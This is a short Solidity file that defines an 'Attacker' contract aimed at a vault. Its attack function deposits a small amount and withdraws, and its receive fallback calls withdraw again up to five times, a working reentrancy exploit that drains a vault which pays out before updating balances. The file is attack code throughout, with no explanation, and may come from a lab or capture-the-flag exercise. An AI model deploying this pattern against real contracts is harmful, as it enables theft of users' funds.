// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVault public vault;
    uint256 public count;

    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether, "Need at least 0.001 POT");
        vault.deposit{value: 0.001 ether}(); 
        vault.withdraw();
    }

    receive() external payable {
        count++;
        if (address(vault).balance >= 0.001 ether && count < 5) {
            vault.withdraw();
        }
    }
}